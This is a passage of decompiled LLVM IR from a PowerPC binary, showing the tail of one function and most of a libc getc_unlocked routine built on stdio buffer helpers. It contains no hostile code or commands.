dec_label_pc_10021a5c:                            ; preds = %dec_label_pc_100219d4, %dec_label_pc_100215b0, %dec_label_pc_10021a38
  %v0_10021ad8 = phi i32 [ %v1_10021a6837, %dec_label_pc_100219d4 ], [ %v2_100215bc, %dec_label_pc_100215b0 ], [ %v1_10021a58, %dec_label_pc_10021a38 ]
  %v2_10021a5c = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_10021a5c, i32* %r9.global-to-local, align 4
  %v1_10021a6c.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10021a60

dec_label_pc_10021a60:                            ; preds = %dec_label_pc_10021a60, %dec_label_pc_10021a5c
  %v1_10021a6c = phi i32 [ %v2_10021a6c, %dec_label_pc_10021a60 ], [ %v1_10021a6c.pre, %dec_label_pc_10021a5c ]
  %v0_10021a60 = phi i32 [ %v1_10021a64, %dec_label_pc_10021a60 ], [ %v2_10021a5c, %dec_label_pc_10021a5c ]
  %v1_10021a60 = inttoptr i32 %v0_10021a60 to i32*
  %v2_10021a60 = load i32, i32* %v1_10021a60, align 4
  store i32 %v2_10021a60, i32* %r0.global-to-local, align 4
  %v1_10021a64 = add i32 %v0_10021a60, 12
  store i32 %v1_10021a64, i32* %r9.global-to-local, align 4
  %v2_10021a68 = icmp ult i32 %v1_10021a64, %v0_10021ad8
  %v2_10021a6c = sub i32 %v1_10021a6c, %v2_10021a60
  store i32 %v2_10021a6c, i32* @r28, align 4
  br i1 %v2_10021a68, label %dec_label_pc_10021a60, label %dec_label_pc_10021a74

dec_label_pc_10021a74:                            ; preds = %dec_label_pc_10021a60
  %v4_10021a68 = icmp eq i32 %v1_10021a64, %v0_10021ad8
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10021a68, i1* %cr7_eq.global-to-local, align 1
  %v3_10021a74 = load i8, i8* %stack_var_-200, align 1
  store i32 160, i32* @r10, align 4
  store i32 160, i32* %stack_var_-156, align 4
  store i32 %v0_10021ad8, i32* @r30, align 4
  %tmp85 = icmp sgt i8 %v3_10021a74, 0
  %v1_10021a88 = zext i1 %tmp85 to i32
  store i32 %v1_10021a88, i32* %r9.global-to-local, align 4
  %v2_10021a8c = ptrtoint i8* %stack_var_-200 to i32
  store i32 %v2_10021a8c, i32* %r0.global-to-local, align 4
  %v2_10021a90 = sub i32 %v2_10021a6c, %v1_10021a88
  store i32 %v2_10021a90, i32* @r11, align 4
  %tmp82 = icmp slt i32 %v2_10021a90, 1
  br i1 %tmp82, label %dec_label_pc_10021afc, label %dec_label_pc_10021aa0

dec_label_pc_10021aa0:                            ; preds = %dec_label_pc_10021a74
  %v3_10021aa0 = load i32, i32* %v2_100214dc, align 4
  store i32 %v3_10021aa0, i32* %r0.global-to-local, align 4
  %v1_10021aa4 = and i32 %v3_10021aa0, 8
  store i32 %v1_10021aa4, i32* %r7.global-to-local, align 4
  %v3_10021aa4 = icmp eq i32 %v1_10021aa4, 0
  br i1 %v3_10021aa4, label %dec_label_pc_10021ac8, label %dec_label_pc_10021aac

dec_label_pc_10021aac:                            ; preds = %dec_label_pc_10021aa0
  %v1_10021ab0 = add i32 %v0_10021ad8, 12
  store i32 %v1_10021ab0, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_1002f97b.1289 to i32), i32* %r9.global-to-local, align 4
  %v2_10021ab8 = inttoptr i32 %v0_10021ad8 to i32*
  store i32 160, i32* %v2_10021ab8, align 4
  %v0_10021abc = load i32, i32* @r11, align 4
  %v1_10021abc = load i32, i32* @r8, align 4
  %v2_10021abc = add i32 %v1_10021abc, 4
  %v3_10021abc = inttoptr i32 %v2_10021abc to i32*
  store i32 %v0_10021abc, i32* %v3_10021abc, align 4
  %v0_10021ac0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10021ac0 = load i32, i32* @r8, align 4
  %v2_10021ac0 = add i32 %v1_10021ac0, 8
  %v3_10021ac0 = inttoptr i32 %v2_10021ac0 to i32*
  store i32 %v0_10021ac0, i32* %v3_10021ac0, align 4
  br label %dec_label_pc_10021afc

dec_label_pc_10021ac8:                            ; preds = %dec_label_pc_10021aa0
  %v1_10021ac8 = add i32 %tmp, 16
  %v2_10021ac8 = inttoptr i32 %v1_10021ac8 to i32*
  %v3_10021ac8 = load i32, i32* %v2_10021ac8, align 4
  store i32 %v3_10021ac8, i32* %r0.global-to-local, align 4
  %v1_10021acc = icmp slt i32 %v3_10021ac8, 48
  %v3_10021acc = icmp eq i32 %v3_10021ac8, 48
  store i1 %v1_10021acc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10021acc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10021acc, label %dec_label_pc_10021ad4, label %dec_label_pc_10021af0

dec_label_pc_10021ad4:                            ; preds = %dec_label_pc_10021ac8
  %v3_10021ad4 = load i32, i32* %stack_var_-140, align 4
  store i32 %v0_10021ad8, i32* @r30, align 4
  %v2_10021adc = add i32 %v3_10021ad4, %v2_10021a90
  store i32 %v2_10021adc, i32* %r0.global-to-local, align 4
  store i32 %v2_10021adc, i32* %stack_var_-140, align 4
  br label %dec_label_pc_10021afc

dec_label_pc_10021ae8:                            ; preds = %dec_label_pc_10021b04
  store i32 -1, i32* @r29, align 4
  br label %dec_label_pc_10021b38

dec_label_pc_10021af0:                            ; preds = %dec_label_pc_10021ac8
  store i32 %v2_10021a6c, i32* %r0.global-to-local, align 4
  store i32 %v0_10021ad8, i32* @r30, align 4
  br label %dec_label_pc_10021afc

dec_label_pc_10021afc:                            ; preds = %dec_label_pc_10021a74, %dec_label_pc_10021ad4, %dec_label_pc_10021aac, %dec_label_pc_10021af0
  store i32 0, i32* @r29, align 4
  %v2_10021b00 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_10021b00, i32* @r31, align 4
  br label %dec_label_pc_10021b04

dec_label_pc_10021b04:                            ; preds = %dec_label_pc_10021b34, %dec_label_pc_10021afc
  %v0_10021b14 = phi i32 [ %v1_10021b20, %dec_label_pc_10021b34 ], [ %v2_10021b00, %dec_label_pc_10021afc ]
  %v1_10021b04 = inttoptr i32 %v0_10021b14 to i32*
  %v2_10021b04 = load i32, i32* %v1_10021b04, align 4
  store i32 %v2_10021b04, i32* %r4.global-to-local, align 4
  %v0_10021b08 = load i32, i32* @r27, align 4
  store i32 %v0_10021b08, i32* %r3.global-to-local, align 4
  %v1_10021b0c = add i32 %v0_10021b14, 4
  %v2_10021b0c = inttoptr i32 %v1_10021b0c to i32*
  %v3_10021b0c = load i32, i32* %v2_10021b0c, align 4
  store i32 %v3_10021b0c, i32* %r5.global-to-local, align 4
  %v0_10021b10 = load i32, i32* @r26, align 4
  store i32 %v0_10021b10, i32* %ctr.global-to-local, align 4
  %v1_10021b14 = add i32 %v0_10021b14, 8
  %v2_10021b14 = inttoptr i32 %v1_10021b14 to i32*
  %v3_10021b14 = load i32, i32* %v2_10021b14, align 4
  store i32 %v3_10021b14, i32* %r6.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_10021b10)
  %v0_10021b1c = load i32, i32* @r31, align 4
  %v1_10021b1c = add i32 %v0_10021b1c, 4
  %v2_10021b1c = inttoptr i32 %v1_10021b1c to i32*
  %v3_10021b1c = load i32, i32* %v2_10021b1c, align 4
  store i32 %v3_10021b1c, i32* %r0.global-to-local, align 4
  %v1_10021b20 = add i32 %v0_10021b1c, 12
  store i32 %v1_10021b20, i32* @r31, align 4
  %v0_10021b24 = load i32, i32* @r29, align 4
  %v1_10021b24 = load i32, i32* %r3.global-to-local, align 4
  %v2_10021b24 = add i32 %v1_10021b24, %v0_10021b24
  store i32 %v2_10021b24, i32* @r29, align 4
  %v1_10021b28 = load i32, i32* @r30, align 4
  %v2_10021b28 = icmp ult i32 %v1_10021b20, %v1_10021b28
  %v3_10021b28 = icmp ugt i32 %v1_10021b20, %v1_10021b28
  %v4_10021b28 = icmp eq i32 %v1_10021b20, %v1_10021b28
  store i1 %v2_10021b28, i1* %cr6_lt.global-to-local, align 1
  store i1 %v3_10021b28, i1* %cr6_gt.global-to-local, align 1
  store i1 %v4_10021b28, i1* %cr6_eq.global-to-local, align 1
  %v2_10021b2c = icmp slt i32 %v1_10021b24, %v3_10021b1c
  %v4_10021b2c = icmp eq i32 %v1_10021b24, %v3_10021b1c
  store i1 %v2_10021b2c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10021b2c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10021b2c, label %dec_label_pc_10021b34, label %dec_label_pc_10021ae8

dec_label_pc_10021b34:                            ; preds = %dec_label_pc_10021b04
  br i1 %v2_10021b28, label %dec_label_pc_10021b04, label %dec_label_pc_10021b38

dec_label_pc_10021b38:                            ; preds = %dec_label_pc_10021b34, %dec_label_pc_10021ae8
  %v0_10021b3c = phi i32 [ -1, %dec_label_pc_10021ae8 ], [ %v2_10021b24, %dec_label_pc_10021b34 ]
  store i32 %v0_10021490, i32* %r0.global-to-local, align 4
  store i32 %v0_10021b3c, i32* %r3.global-to-local, align 4
  ret i32 %v0_10021b3c

; uselistorder directives
  uselistorder i32 %v0_10021b3c, { 1, 0 }
  uselistorder i32 %v1_10021b24, { 2, 1, 0 }
  uselistorder i32 %v1_10021b20, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v3_10021b1c, { 1, 0, 2 }
  uselistorder i32 %v0_10021b14, { 0, 2, 1 }
  uselistorder i32 %v3_10021ac8, { 1, 0, 2 }
  uselistorder i32 %v1_10021a88, { 1, 0 }
  uselistorder i32 %v2_10021a6c, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10021a64, { 0, 2, 3, 1 }
  uselistorder i32 %v0_10021a60, { 1, 0 }
  uselistorder i32 %v0_10021ad8, { 3, 2, 5, 4, 6, 1, 0 }
  uselistorder i32 %v3_10021a2c, { 1, 2, 0 }
  uselistorder i32 %v1_10021a10, { 1, 0, 2 }
  uselistorder i32 %v2_10021a0c, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_100219dc, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v1_100219ac, { 2, 0, 1 }
  uselistorder i32 %v2_100219a8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_10021918, { 1, 0 }
  uselistorder i32 %v2_10021880, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_10021850, { 4, 0, 3, 2, 1 }
  uselistorder i32 %v1_10021818, { 3, 0, 1, 2 }
  uselistorder i32 %v0_10021810, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32 %v2_100217dc, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32 %v0_100217cc, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_100217c0, { 1, 0, 2 }
  uselistorder i32 %v1_100217a4, { 0, 3, 2, 1 }
  uselistorder i32 %v2_1002175c, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_1002174c, { 1, 0, 3, 2 }
  uselistorder i32 %v1_10021730, { 1, 0 }
  uselistorder i32 %v1_1002170c, { 1, 0 }
  uselistorder i32 %v2_100216ec, { 1, 0, 2 }
  uselistorder i32 %v0_10021694, { 1, 0 }
  uselistorder i32 %v1_100214f8, { 1, 0 }
  uselistorder i32 %v0_10021588, { 2, 1, 0 }
  uselistorder i32 %v1_100214cc, { 1, 0 }
  uselistorder i32 %v1_100214b4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-132, { 1, 0, 2 }
  uselistorder i32* %stack_var_-177, { 1, 2, 0 }
  uselistorder i32* %stack_var_-120, { 1, 0, 2 }
  uselistorder i32* %stack_var_-140, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-200, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5, 6 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20, 18, 21, 22, 19, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 7, 6, 8, 5, 9, 10, 11, 12, 13 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 4, 7, 5, 8, 6, 9, 10, 0 }
  uselistorder i32* %r31.global-to-local, { 2, 3, 4, 5, 0, 6, 1, 7 }
  uselistorder i32* %r30.global-to-local, { 3, 4, 0, 5, 1, 6, 7, 2, 8 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 1, 5, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 9, 10, 11, 6, 7, 8, 12, 13, 14, 17, 15, 18, 16, 19, 20, 21, 22 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 9, 7, 10, 13, 11, 12, 14, 15, 16, 18, 17 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 19, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0, 37, 38, 39, 40 }
  uselistorder i1* %cr7_lt.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i1* %cr7_eq.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31 }
  uselistorder i1* %cr6_gt.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 160, { 0, 1, 7, 9, 8, 2, 3, 4, 5, 6 }
  uselistorder i32 45, { 3, 1, 2, 4, 0 }
  uselistorder i32 112, { 2, 3, 0, 1, 4 }
  uselistorder i32 176, { 2, 3, 0, 4, 5, 1 }
  uselistorder i8 48, { 2, 3, 4, 5, 7, 6, 8, 0, 9, 1 }
  uselistorder i32 102, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 103, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder %1 (i32, i32, i32)* @__asm_cror, { 1, 0 }
  uselistorder i32 -2147483648, { 12, 0, 1, 17, 16, 2, 4, 3, 18, 6, 5, 19, 8, 7, 20, 9, 21, 13, 10, 11, 14, 15 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), { 142, 143, 144, 145, 146, 147, 114, 148, 149, 150, 151, 115, 116, 0, 1, 2, 3, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 4, 5, 6, 127, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 58, 59, 57, 56, 60, 128, 61, 64, 129, 130, 65, 63, 62, 66, 67, 74, 71, 73, 72, 70, 68, 69, 75, 76, 77, 131, 132, 78, 133, 79, 134, 135, 136, 137, 80, 81, 138, 139, 82, 83, 84, 152, 153, 85, 154, 155, 156, 86, 157, 87, 158, 88, 159, 89, 160, 161, 90, 162, 91, 163, 92, 164, 165, 166, 93, 167, 168, 169, 94, 170, 171, 95, 172, 96, 173, 98, 99, 97, 100, 140, 101, 102, 103, 104, 105, 106, 107, 110, 111, 109, 108, 112, 113, 141 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1002f978.1287 to i32), { 2, 0, 1 }
  uselistorder i32 43, { 1, 0 }
  uselistorder i32 97, { 9, 5, 1, 6, 7, 8, 4, 2, 3, 0 }
  uselistorder label %dec_label_pc_10021afc, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10021a5c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10021a0c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_100219f8, { 1, 0 }
  uselistorder label %dec_label_pc_100219d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100219a8, { 1, 0 }
  uselistorder label %dec_label_pc_10021994, { 1, 0 }
  uselistorder label %dec_label_pc_10021978, { 1, 0 }
  uselistorder label %dec_label_pc_10021950, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10021930, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1002190c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100218f0, { 1, 0 }
  uselistorder label %dec_label_pc_10021860, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100217fc, { 1, 0 }
  uselistorder label %dec_label_pc_100217bc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10021780, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10021754, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10021734, { 1, 0 }
  uselistorder label %dec_label_pc_100216c0, { 1, 0 }
  uselistorder label %dec_label_pc_100215b0, { 1, 0 }
  uselistorder label %dec_label_pc_10021508, { 1, 0 }
  uselistorder label %dec_label_pc_100214dc, { 1, 0 }
  uselistorder label %dec_label_pc_100214d0, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i8, align 1
  %v0_10021b54 = load i32, i32* @lr, align 4
  store i32 %v0_10021b54, i32* %r0.global-to-local, align 4
  %v0_10021b58 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_10021b64 = add i32 %tmp, 16
  %v3_10021b64 = inttoptr i32 %v2_10021b64 to i32*
  %v4_10021b64 = load i32, i32* %v3_10021b64, align 4
  store i32 %v4_10021b64, i32* %r9.global-to-local, align 4
  %v2_10021b68 = add i32 %tmp, 24
  %v3_10021b68 = inttoptr i32 %v2_10021b68 to i32*
  %v4_10021b68 = load i32, i32* %v3_10021b68, align 4
  store i32 %v4_10021b68, i32* %r0.global-to-local, align 4
  %v2_10021b6c = icmp ult i32 %v4_10021b64, %v4_10021b68
  br i1 %v2_10021b6c, label %dec_label_pc_10021bd4, label %dec_label_pc_10021b74

dec_label_pc_10021b74:                            ; preds = %entry
  %v3_10021b74 = load i16, i16* %arg1, align 2
  %v4_10021b74 = zext i16 %v3_10021b74 to i32
  %v1_10021b78 = and i32 %v4_10021b74, 131
  store i32 %v1_10021b78, i32* %r0.global-to-local, align 4
  %v2_10021b7c = icmp ugt i32 %v1_10021b78, 128
  br i1 %v2_10021b7c, label %dec_label_pc_10021b94, label %dec_label_pc_10021b84

dec_label_pc_10021b84:                            ; preds = %dec_label_pc_10021b74
  store i32 268573580, i32* @lr, align 4
  %v3_10021b88 = call i32 @__stdio_trans2r_o(i16* inttoptr (i32 128 to i16*), i32 %v4_10021b64)
  store i32 %v3_10021b88, i32* %r3.global-to-local, align 4
  %v3_10021b8c = icmp eq i32 %v3_10021b88, 0
  br i1 %v3_10021b8c, label %dec_label_pc_10021b84.dec_label_pc_10021b94_crit_edge, label %dec_label_pc_10021c70

dec_label_pc_10021b84.dec_label_pc_10021b94_crit_edge: ; preds = %dec_label_pc_10021b84
  %v0_10021b94.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10021b94

dec_label_pc_10021b94:                            ; preds = %dec_label_pc_10021b84.dec_label_pc_10021b94_crit_edge, %dec_label_pc_10021b74
  %v2_10021bf4 = phi i32 [ %v0_10021b94.pre, %dec_label_pc_10021b84.dec_label_pc_10021b94_crit_edge ], [ %tmp, %dec_label_pc_10021b74 ]
  %v1_10021b94 = inttoptr i32 %v2_10021bf4 to i16*
  %v2_10021b94 = load i16, i16* %v1_10021b94, align 2
  %v3_10021b94 = zext i16 %v2_10021b94 to i32
  %v1_10021b98 = and i32 %v3_10021b94, 2
  store i32 %v1_10021b98, i32* %r0.global-to-local, align 4
  %v3_10021b98 = icmp eq i32 %v1_10021b98, 0
  br i1 %v3_10021b98, label %dec_label_pc_10021bc4, label %dec_label_pc_10021ba0

dec_label_pc_10021ba0:                            ; preds = %dec_label_pc_10021b94
  %v1_10021ba0 = call i32 @__asm_rlwinm(i32 %v3_10021b94, i32 2, i32 29, i32 29)
  %v1_10021ba4 = load i32, i32* @r31, align 4
  %v2_10021ba4 = add i32 %v1_10021ba4, %v1_10021ba0
  store i32 %v2_10021ba4, i32* %r9.global-to-local, align 4
  %v1_10021ba8 = add i32 %v2_10021ba4, 39
  %v2_10021ba8 = inttoptr i32 %v1_10021ba8 to i8*
  %v3_10021ba8 = load i8, i8* %v2_10021ba8, align 1
  %v4_10021ba8 = zext i8 %v3_10021ba8 to i32
  store i32 %v4_10021ba8, i32* %r0.global-to-local, align 4
  %v1_10021bac = add nsw i32 %v3_10021b94, -1
  store i32 %v1_10021bac, i32* %r9.global-to-local, align 4
  %v1_10021bb0 = trunc i32 %v1_10021bac to i16
  %v3_10021bb0 = inttoptr i32 %v1_10021ba4 to i16*
  store i16 %v1_10021bb0, i16* %v3_10021bb0, align 2
  %v0_10021bb4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10021bb4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10021bbc = load i32, i32* @r31, align 4
  %v2_10021bbc = add i32 %v1_10021bbc, 40
  %v3_10021bbc = inttoptr i32 %v2_10021bbc to i32*
  store i32 0, i32* %v3_10021bbc, align 4
  br label %dec_label_pc_10021c74

dec_label_pc_10021bc4:                            ; preds = %dec_label_pc_10021b94
  %v1_10021bc4 = add i32 %v2_10021bf4, 16
  %v2_10021bc4 = inttoptr i32 %v1_10021bc4 to i32*
  %v3_10021bc4 = load i32, i32* %v2_10021bc4, align 4
  store i32 %v3_10021bc4, i32* %r9.global-to-local, align 4
  %v1_10021bc8 = add i32 %v2_10021bf4, 20
  %v2_10021bc8 = inttoptr i32 %v1_10021bc8 to i32*
  %v3_10021bc8 = load i32, i32* %v2_10021bc8, align 4
  store i32 %v3_10021bc8, i32* %r0.global-to-local, align 4
  %v4_10021bcc = icmp eq i32 %v3_10021bc8, %v3_10021bc4
  br i1 %v4_10021bcc, label %dec_label_pc_10021be0, label %dec_label_pc_10021bd4

dec_label_pc_10021bd4:                            ; preds = %dec_label_pc_10021bc4, %entry
  %v1_10021c487 = phi i32 [ %v2_10021bf4, %dec_label_pc_10021bc4 ], [ %tmp, %entry ]
  %v0_10021bd4 = phi i32 [ %v3_10021bc4, %dec_label_pc_10021bc4 ], [ %v4_10021b64, %entry ]
  %v1_10021bd4 = inttoptr i32 %v0_10021bd4 to i8*
  %v2_10021bd4 = load i8, i8* %v1_10021bd4, align 1
  %v3_10021bd4 = zext i8 %v2_10021bd4 to i32
  store i32 %v3_10021bd4, i32* %r3.global-to-local, align 4
  %v1_10021bd8 = add i32 %v0_10021bd4, 1
  store i32 %v1_10021bd8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10021c48

dec_label_pc_10021be0:                            ; preds = %dec_label_pc_10021bc4
  %v1_10021be0 = add i32 %v2_10021bf4, 4
  %v2_10021be0 = inttoptr i32 %v1_10021be0 to i32*
  %v3_10021be0 = load i32, i32* %v2_10021be0, align 4
  store i32 %v3_10021be0, i32* %r0.global-to-local, align 4
  %v3_10021be4 = icmp eq i32 %v3_10021be0, -2
  br i1 %v3_10021be4, label %dec_label_pc_10021bec, label %dec_label_pc_10021bfc

dec_label_pc_10021bec:                            ; preds = %dec_label_pc_10021be0
  %v1_10021bec = or i32 %v3_10021b94, 4
  store i32 %v1_10021bec, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10021bf4 = trunc i32 %v1_10021bec to i16
  store i16 %v1_10021bf4, i16* %v1_10021b94, align 2
  br label %dec_label_pc_10021c74

dec_label_pc_10021bfc:                            ; preds = %dec_label_pc_10021be0
  %v1_10021bfc = and i32 %v3_10021b94, 768
  store i32 %v1_10021bfc, i32* %r0.global-to-local, align 4
  %v3_10021bfc = icmp eq i32 %v1_10021bfc, 0
  br i1 %v3_10021bfc, label %dec_label_pc_10021c10, label %dec_label_pc_10021c04

dec_label_pc_10021c04:                            ; preds = %dec_label_pc_10021bfc
  store i32 ptrtoint (i32** @global_var_10045128.997 to i32), i32* %r3.global-to-local, align 4
  store i32 268573712, i32* @lr, align 4
  %v4_10021c0c = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_10045128.997 to i16*), i32 %v3_10021bc4)
  store i32 %v4_10021c0c, i32* %r3.global-to-local, align 4
  %v0_10021c10.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10021c10

dec_label_pc_10021c10:                            ; preds = %dec_label_pc_10021bfc, %dec_label_pc_10021c04
  %v0_10021c50 = phi i32 [ %v2_10021bf4, %dec_label_pc_10021bfc ], [ %v0_10021c10.pre, %dec_label_pc_10021c04 ]
  %v1_10021c10 = add i32 %v0_10021c50, 8
  %v2_10021c10 = inttoptr i32 %v1_10021c10 to i32*
  %v3_10021c10 = load i32, i32* %v2_10021c10, align 4
  store i32 %v3_10021c10, i32* %r9.global-to-local, align 4
  %v1_10021c14 = add i32 %v0_10021c50, 12
  %v2_10021c14 = inttoptr i32 %v1_10021c14 to i32*
  %v3_10021c14 = load i32, i32* %v2_10021c14, align 4
  store i32 %v3_10021c14, i32* %r0.global-to-local, align 4
  %v4_10021c18 = icmp eq i32 %v3_10021c14, %v3_10021c10
  br i1 %v4_10021c18, label %dec_label_pc_10021c50, label %dec_label_pc_10021c20

dec_label_pc_10021c20:                            ; preds = %dec_label_pc_10021c10
  %v2_10021c20 = add i32 %v0_10021c50, 24
  %v3_10021c20 = inttoptr i32 %v2_10021c20 to i32*
  store i32 %v3_10021c10, i32* %v3_10021c20, align 4
  %v0_10021c24 = load i32, i32* @r31, align 4
  store i32 %v0_10021c24, i32* %r3.global-to-local, align 4
  store i32 268573740, i32* @lr, align 4
  %v3_10021c28 = call i32 @__stdio_rfill(i32 %v0_10021c24, i32 %v3_10021c10)
  store i32 %v3_10021c28, i32* %r3.global-to-local, align 4
  %v3_10021c2c = icmp eq i32 %v3_10021c28, 0
  br i1 %v3_10021c2c, label %dec_label_pc_10021c70, label %dec_label_pc_10021c34

dec_label_pc_10021c34:                            ; preds = %dec_label_pc_10021c20
  %v0_10021c34 = load i32, i32* @r31, align 4
  %v1_10021c34 = add i32 %v0_10021c34, 20
  %v2_10021c34 = inttoptr i32 %v1_10021c34 to i32*
  %v3_10021c34 = load i32, i32* %v2_10021c34, align 4
  store i32 %v3_10021c34, i32* %r0.global-to-local, align 4
  %v1_10021c38 = add i32 %v0_10021c34, 16
  %v2_10021c38 = inttoptr i32 %v1_10021c38 to i32*
  %v3_10021c38 = load i32, i32* %v2_10021c38, align 4
  store i32 %v3_10021c38, i32* %r9.global-to-local, align 4
  %v2_10021c3c = add i32 %v0_10021c34, 24
  %v3_10021c3c = inttoptr i32 %v2_10021c3c to i32*
  store i32 %v3_10021c34, i32* %v3_10021c3c, align 4
  %v0_10021c40 = load i32, i32* %r9.global-to-local, align 4
  %v1_10021c40 = add i32 %v0_10021c40, 1
  store i32 %v1_10021c40, i32* %r0.global-to-local, align 4
  %v1_10021c44 = inttoptr i32 %v0_10021c40 to i8*
  %v2_10021c44 = load i8, i8* %v1_10021c44, align 1
  %v3_10021c44 = zext i8 %v2_10021c44 to i32
  store i32 %v3_10021c44, i32* %r3.global-to-local, align 4
  %v1_10021c48.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10021c48

dec_label_pc_10021c48:                            ; preds = %dec_label_pc_10021bd4, %dec_label_pc_10021c34
  %v1_10021c48 = phi i32 [ %v1_10021c487, %dec_label_pc_10021bd4 ], [ %v1_10021c48.pre, %dec_label_pc_10021c34 ]
  %v0_10021c48 = phi i32 [ %v1_10021bd8, %dec_label_pc_10021bd4 ], [ %v1_10021c40, %dec_label_pc_10021c34 ]
  %v2_10021c48 = add i32 %v1_10021c48, 16
  %v3_10021c48 = inttoptr i32 %v2_10021c48 to i32*
  store i32 %v0_10021c48, i32* %v3_10021c48, align 4
  br label %dec_label_pc_10021c74

dec_label_pc_10021c50:                            ; preds = %dec_label_pc_10021c10
  %v1_10021c50 = inttoptr i32 %v0_10021c50 to i16*
  store i32 %v0_10021c50, i32* %r3.global-to-local, align 4
  %v2_10021c54 = ptrtoint i8* %stack_var_-24 to i32
  store i32 268573792, i32* @lr, align 4
  %v5_10021c5c = call i32 @__stdio_READ(i16* %v1_10021c50, i32 %v2_10021c54, i32 1)
  store i32 %v5_10021c5c, i32* %r3.global-to-local, align 4
  %v3_10021c60 = icmp eq i32 %v5_10021c5c, 0
  br i1 %v3_10021c60, label %dec_label_pc_10021c70, label %dec_label_pc_10021c68

dec_label_pc_10021c68:                            ; preds = %dec_label_pc_10021c50
  %v3_10021c68 = load i8, i8* %stack_var_-24, align 1
  %v4_10021c68 = sext i8 %v3_10021c68 to i32
  store i32 %v4_10021c68, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10021c74

dec_label_pc_10021c70:                            ; preds = %dec_label_pc_10021b84, %dec_label_pc_10021c50, %dec_label_pc_10021c20
  store i32 -1, i32* %r3.global-to-local, align 4
